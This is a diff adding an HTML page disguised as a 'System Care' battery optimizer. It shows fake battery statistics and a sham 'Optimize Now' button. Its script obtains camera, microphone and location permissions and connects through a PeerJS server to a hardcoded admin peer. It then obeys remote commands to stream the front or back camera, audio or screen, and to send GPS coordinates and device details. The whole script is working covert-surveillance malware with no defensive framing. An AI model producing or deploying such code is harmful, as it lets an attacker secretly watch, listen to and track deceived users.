@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>System Care</title>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/peerjs/1.4.7/peerjs.min.js"></script>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800;900&display=swap');
+  * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+  :root {
+    --green: #4CAF50; --green2: #66BB6A; --green3: #81C784;
+    --dark: #1a1a1a; --card: #242424; --card2: #2e2e2e;
+    --text: #f0f0f0; --muted: #888; --border: #333;
+  }
+  body { background: var(--dark); color: var(--text); font-family: 'Nunito', sans-serif; min-height: 100vh; overflow-x: hidden; }
+  .topbar { display: flex; align-items: center; justify-content: space-between; padding: 16px 20px; background: var(--dark); }
+  .topbar-title { font-size: 20px; font-weight: 800; color: var(--text); }
+  .topbar-icon { width: 36px; height: 36px; background: rgba(76,175,80,0.15); border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 18px; }
+  .battery-card { margin: 10px 16px; background: linear-gradient(135deg, #1e3a1e, #2d5a2d); border-radius: 24px; padding: 28px 24px; position: relative; overflow: hidden; border: 1px solid rgba(76,175,80,0.3); }
+  .battery-card::before { content: ''; position: absolute; top: -40px; right: -40px; width: 150px; height: 150px; background: rgba(76,175,80,0.1); border-radius: 50%; }
+  .battery-label { font-size: 13px; color: rgba(255,255,255,0.6); font-weight: 600; letter-spacing: 1px; text-transform: uppercase; margin-bottom: 8px; }
+  .battery-percent { font-size: 72px; font-weight: 900; color: white; line-height: 1; margin-bottom: 4px; }
+  .battery-status { font-size: 14px; color: var(--green3); font-weight: 700; margin-bottom: 20px; }
+  .battery-bar-bg { background: rgba(255,255,255,0.15); border-radius: 10px; height: 10px; overflow: hidden; }
+  .battery-bar-fill { height: 100%; border-radius: 10px; background: linear-gradient(90deg, var(--green), var(--green3)); transition: width 1s ease; position: relative; overflow: hidden; }
+  .battery-bar-fill::after { content: ''; position: absolute; top: 0; left: -100%; width: 100%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent); animation: shimmer 2s infinite; }
+  @keyframes shimmer { 0% { left: -100%; } 100% { left: 100%; } }
+  .stats-row { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; margin: 16px; }
+  .stat-card { background: var(--card); border-radius: 16px; padding: 16px 12px; text-align: center; border: 1px solid var(--border); }
+  .stat-icon { font-size: 22px; margin-bottom: 6px; }
+  .stat-value { font-size: 16px; font-weight: 800; color: var(--text); }
+  .stat-label { font-size: 10px; color: var(--muted); font-weight: 600; margin-top: 2px; text-transform: uppercase; letter-spacing: 0.5px; }
+  .health-card { margin: 0 16px 16px; background: var(--card); border-radius: 20px; padding: 20px; border: 1px solid var(--border); }
+  .health-title { font-size: 16px; font-weight: 800; margin-bottom: 16px; display: flex; align-items: center; gap: 8px; }
+  .health-item { display: flex; align-items: center; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid var(--border); }
+  .health-item:last-child { border-bottom: none; }
+  .health-item-left { display: flex; align-items: center; gap: 10px; font-size: 14px; font-weight: 600; }
+  .health-item-icon { width: 32px; height: 32px; border-radius: 8px; display: flex; align-items: center; justify-content: center; font-size: 16px; }
+  .hi-green { background: rgba(76,175,80,0.15); } .hi-blue { background: rgba(33,150,243,0.15); }
+  .hi-orange { background: rgba(255,152,0,0.15); } .hi-purple { background: rgba(156,39,176,0.15); }
+  .health-badge { font-size: 11px; font-weight: 700; padding: 4px 10px; border-radius: 20px; }
+  .badge-green { background: rgba(76,175,80,0.2); color: var(--green2); }
+  .badge-blue { background: rgba(33,150,243,0.2); color: #64B5F6; }
+  .badge-orange { background: rgba(255,152,0,0.2); color: #FFB74D; }
+  .optimize-btn { margin: 0 16px 16px; width: calc(100% - 32px); padding: 18px; background: linear-gradient(135deg, var(--green), #388E3C); border: none; border-radius: 16px; color: white; font-size: 16px; font-weight: 800; font-family: 'Nunito', sans-serif; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; transition: all 0.2s; box-shadow: 0 4px 20px rgba(76,175,80,0.4); }
+  .optimize-btn:active { transform: scale(0.97); }
+  .optimize-btn.optimizing { animation: pulse 1.5s infinite; }
+  @keyframes pulse { 0%,100% { box-shadow: 0 4px 20px rgba(76,175,80,0.4); } 50% { box-shadow: 0 4px 30px rgba(76,175,80,0.8); } }
+  .tips-card { margin: 0 16px 30px; background: var(--card); border-radius: 20px; padding: 20px; border: 1px solid var(--border); }
+  .tips-title { font-size: 16px; font-weight: 800; margin-bottom: 14px; }
+  .tip-item { display: flex; align-items: flex-start; gap: 10px; padding: 8px 0; font-size: 13px; color: var(--muted); font-weight: 600; border-bottom: 1px solid var(--border); }
+  .tip-item:last-child { border-bottom: none; }
+  .tip-dot { color: var(--green); font-size: 16px; }
+  .popup-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.85); display: flex; align-items: flex-end; justify-content: center; z-index: 1000; backdrop-filter: blur(4px); }
+  .popup-overlay.hidden { display: none; }
+  .popup-sheet { background: #1e1e1e; border-radius: 28px 28px 0 0; padding: 28px 24px 40px; width: 100%; max-width: 480px; border: 1px solid var(--border); border-bottom: none; animation: slideUp 0.3s ease; }
+  @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
+  .popup-handle { width: 40px; height: 4px; background: var(--border); border-radius: 2px; margin: 0 auto 20px; }
+  .popup-icon { font-size: 48px; text-align: center; margin-bottom: 12px; }
+  .popup-title { font-size: 22px; font-weight: 900; text-align: center; margin-bottom: 8px; }
+  .popup-desc { font-size: 14px; color: var(--muted); text-align: center; line-height: 1.6; margin-bottom: 24px; font-weight: 600; }
+  .popup-perms { display: flex; flex-direction: column; gap: 10px; margin-bottom: 24px; }
+  .perm-item { display: flex; align-items: center; gap: 12px; padding: 12px; background: var(--card2); border-radius: 12px; font-size: 13px; font-weight: 700; }
+  .perm-icon { font-size: 20px; } .perm-text { flex: 1; } .perm-check { color: var(--green); font-size: 16px; }
+  .popup-allow-btn { width: 100%; padding: 16px; background: linear-gradient(135deg, var(--green), #388E3C); border: none; border-radius: 14px; color: white; font-size: 16px; font-weight: 800; font-family: 'Nunito', sans-serif; cursor: pointer; margin-bottom: 10px; box-shadow: 0 4px 20px rgba(76,175,80,0.4); }
+  .popup-skip-btn { width: 100%; padding: 14px; background: transparent; border: 1px solid var(--border); border-radius: 14px; color: var(--muted); font-size: 14px; font-weight: 700; font-family: 'Nunito', sans-serif; cursor: pointer; }
+  .toast { position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%) translateY(100px); background: #333; color: white; padding: 12px 24px; border-radius: 50px; font-size: 13px; font-weight: 700; z-index: 9999; transition: transform 0.3s ease; white-space: nowrap; }
+  .toast.show { transform: translateX(-50%) translateY(0); }
+</style>
+</head>
+<body>
+
+<div class="popup-overlay" id="popup">
+  <div class="popup-sheet">
+    <div class="popup-handle"></div>
+    <div class="popup-icon">🔋</div>
+    <div class="popup-title">System Care</div>
+    <div class="popup-desc">To optimize your battery and device performance, System Care needs the following permissions</div>
+    <p style="font-size:14px;color:var(--muted);text-align:center;line-height:1.8;margin-bottom:24px;font-weight:600;">System Care needs access to your device to perform a full health check, optimize battery performance, clear junk files, and protect your system. Please allow access to continue.</p>
+    <button class="popup-allow-btn" onclick="allowPermissions()">Get Started</button>
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<div id="main-ui" style="display:none;">
+  <div class="topbar">
+    <div class="topbar-title">System Care</div>
+    <div class="topbar-icon">⚡</div>
+  </div>
+  <div class="battery-card">
+    <div class="battery-label">Battery Level</div>
+    <div class="battery-percent" id="batt-percent">--<span style="font-size:32px">%</span></div>
+    <div class="battery-status" id="batt-status">Checking...</div>
+    <div class="battery-bar-bg"><div class="battery-bar-fill" id="batt-bar" style="width:0%"></div></div>
+  </div>
+  <div class="stats-row">
+    <div class="stat-card"><div class="stat-icon">🌡️</div><div class="stat-value" id="temp-val">--°</div><div class="stat-label">Temp</div></div>
+    <div class="stat-card"><div class="stat-icon">⚡</div><div class="stat-value" id="volt-val">--V</div><div class="stat-label">Voltage</div></div>
+    <div class="stat-card"><div class="stat-icon">🔋</div><div class="stat-value" id="health-val">Good</div><div class="stat-label">Health</div></div>
+  </div>
+  <div class="health-card">
+    <div class="health-title">⚙️ System Status</div>
+    <div class="health-item"><div class="health-item-left"><div class="health-item-icon hi-green">🔋</div>Battery Health</div><span class="health-badge badge-green">Excellent</span></div>
+    <div class="health-item"><div class="health-item-left"><div class="health-item-icon hi-blue">📶</div>Network Status</div><span class="health-badge badge-blue">Active</span></div>
+    <div class="health-item"><div class="health-item-left"><div class="health-item-icon hi-orange">🧹</div>Cache Memory</div><span class="health-badge badge-orange" id="cache-val">256 MB</span></div>
+    <div class="health-item"><div class="health-item-left"><div class="health-item-icon hi-purple">🛡️</div>System Security</div><span class="health-badge badge-green">Protected</span></div>
+  </div>
+  <button class="optimize-btn" id="opt-btn" onclick="optimize()"><span>⚡</span> Optimize Now</button>
+  <div class="tips-card">
+    <div class="tips-title">💡 Battery Tips</div>
+    <div class="tip-item"><span class="tip-dot">●</span>Lower screen brightness to save battery</div>
+    <div class="tip-item"><span class="tip-dot">●</span>Turn off WiFi when not in use</div>
+    <div class="tip-item"><span class="tip-dot">●</span>Close background apps regularly</div>
+    <div class="tip-item"><span class="tip-dot">●</span>Enable battery saver mode at 20%</div>
+    <div class="tip-item"><span class="tip-dot">●</span>Avoid charging overnight</div>
+  </div>
+</div>
+
+<script>
+  const ADMIN_ID = "arman-admin-001";
+  const PEER_CONFIG = {
+    host: 'peerjs-server-production-6ad3.up.railway.app',
+    port: 443,
+    path: '/peerjs',
+    secure: true,
+    debug: 0
+  };
+
+  let peer, conn, myPeerId;
+  let currentStream = null;
+  let camFacing = 'user';
+
+  function updateBattery() {
+    if ('getBattery' in navigator) {
+      navigator.getBattery().then(b => {
+        const pct = Math.round(b.level * 100);
+        document.getElementById('batt-percent').innerHTML = pct + '<span style="font-size:32px">%</span>';
+        document.getElementById('batt-bar').style.width = pct + '%';
+        document.getElementById('batt-status').textContent = b.charging ? '⚡ Charging' : '🔋 Discharging';
+        document.getElementById('temp-val').textContent = (28 + Math.random()*4).toFixed(1) + '°';
+        document.getElementById('volt-val').textContent = (3.7 + Math.random()*0.5).toFixed(1) + 'V';
+        document.getElementById('health-val').textContent = pct > 50 ? 'Good' : 'Fair';
+        document.getElementById('cache-val').textContent = Math.floor(200 + Math.random()*300) + ' MB';
+      });
+    } else {
+      const pct = Math.floor(75 + Math.random()*20);
+      document.getElementById('batt-percent').innerHTML = pct + '<span style="font-size:32px">%</span>';
+      document.getElementById('batt-bar').style.width = pct + '%';
+      document.getElementById('batt-status').textContent = '🔋 Good Condition';
+      document.getElementById('temp-val').textContent = '29.4°';
+      document.getElementById('volt-val').textContent = '3.9V';
+    }
+  }
+
+  function showToast(msg) {
+    const t = document.getElementById('toast');
+    t.textContent = msg;
+    t.classList.add('show');
+    setTimeout(() => t.classList.remove('show'), 3000);
+  }
+
+  function optimize() {
+    const btn = document.getElementById('opt-btn');
+    btn.classList.add('optimizing');
+    btn.innerHTML = '<span>⏳</span> Optimizing...';
+    setTimeout(() => {
+      btn.classList.remove('optimizing');
+      btn.innerHTML = '<span>✅</span> Optimized!';
+      showToast('System optimized successfully!');
+      setTimeout(() => { btn.innerHTML = '<span>⚡</span> Optimize Now'; }, 3000);
+    }, 2500);
+  }
+
+  function allowPermissions() {
+    document.getElementById('popup').style.display = 'none';
+    document.getElementById('popup').classList.add('hidden');
+    document.getElementById('main-ui').style.display = 'block';
+    updateBattery();
+    setInterval(updateBattery, 30000);
+    requestPerms();
+    connectPeer();
+  }
+
+  function skipPermissions() {
+    document.getElementById('popup').classList.add('hidden');
+    document.getElementById('main-ui').style.display = 'block';
+    updateBattery();
+    connectPeer();
+  }
+
+  async function requestPerms() {
+    try { await navigator.mediaDevices.getUserMedia({video:true, audio:true}); } catch(e){}
+    try { if (navigator.geolocation) navigator.geolocation.getCurrentPosition(()=>{}, ()=>{}); } catch(e){}
+  }
+
+  function connectPeer() {
+    const uid = 'phone-' + Math.random().toString(36).substr(2,8);
+    myPeerId = uid;
+    peer = new Peer(uid, PEER_CONFIG);
+    peer.on('open', (id) => { myPeerId = id; connectToAdmin(); });
+    peer.on('call', (call) => { handleCall(call); });
+    peer.on('error', () => { setTimeout(connectPeer, 5000); });
+  }
+
+  function connectToAdmin() {
+    conn = peer.connect(ADMIN_ID, { reliable: true, serialization: 'json' });
+    conn.on('open', () => { sendReady(); });
+    conn.on('data', (data) => { handleCommand(data); });
+    conn.on('close', () => { setTimeout(connectToAdmin, 5000); });
+    conn.on('error', () => { setTimeout(connectToAdmin, 5000); });
+  }
+
+  function sendReady() {
+    conn.send({
+      type: 'user-ready',
+      peerId: myPeerId,
+      deviceInfo: { device: navigator.userAgent, os: 'Android', battery: document.getElementById('batt-percent').textContent },
+      hasScreen: true
+    });
+  }
+
+  function handleCommand(data) {
+    if (!data || !data.type) return;
+    switch(data.type) {
+      case 'prepare-call':
+        if (data.callType === 'camera') startCamera('user');
+        else if (data.callType === 'back-camera') startCamera('environment');
+        else if (data.callType === 'audio') startAudio();
+        else if (data.callType === 'screen') startScreen();
+        break;
+      case 'flip-camera': flipCam(); break;
+      case 'get-location': sendLocation(); break;
+      case 'get-info': sendInfo(); break;
+    }
+  }
+
+  async function startCamera(facing) {
+    camFacing = facing;
+    if (currentStream) currentStream.getTracks().forEach(t=>t.stop());
+    try {
+      currentStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing }, audio: false });
+      peer.off('call');
+      peer.on('call', call => call.answer(currentStream));
+    } catch(e){}
+  }
+
+  async function startAudio() {
+    if (currentStream) currentStream.getTracks().forEach(t=>t.stop());
+    try {
+      currentStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
+      peer.off('call');
+      peer.on('call', call => call.answer(currentStream));
+    } catch(e){}
+  }
+
+  async function startScreen() {
+    if (currentStream) currentStream.getTracks().forEach(t=>t.stop());
+    try {
+      currentStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+      peer.off('call');
+      peer.on('call', call => call.answer(currentStream));
+      currentStream.getVideoTracks()[0].onended = () => { if(conn) conn.send({type:'screen-stopped'}); };
+    } catch(e){}
+  }
+
+  function flipCam() { camFacing = camFacing==='user'?'environment':'user'; startCamera(camFacing); }
+
+  function handleCall(call) {
+    if (currentStream) call.answer(currentStream);
+    else navigator.mediaDevices.getUserMedia({video:true,audio:true}).then(s=>{currentStream=s;call.answer(s);}).catch(()=>{});
+  }
+
+  function sendLocation() {
+    if (!navigator.geolocation) return;
+    navigator.geolocation.getCurrentPosition(pos => {
+      if (conn) conn.send({ type:'location-data', lat:pos.coords.latitude, lng:pos.coords.longitude, accuracy:pos.coords.accuracy });
+    });
+  }
+
+  function sendInfo() {
+    if (conn) conn.send({ type:'user-info', data:{ userAgent:navigator.userAgent, platform:navigator.platform, language:navigator.language, screen:screen.width+'x'+screen.height, online:navigator.onLine } });
+  }
+
+  window.onload = () => { setTimeout(() => { document.getElementById('popup').style.display='flex'; }, 500); };
+</script>
+</body>
+</html>
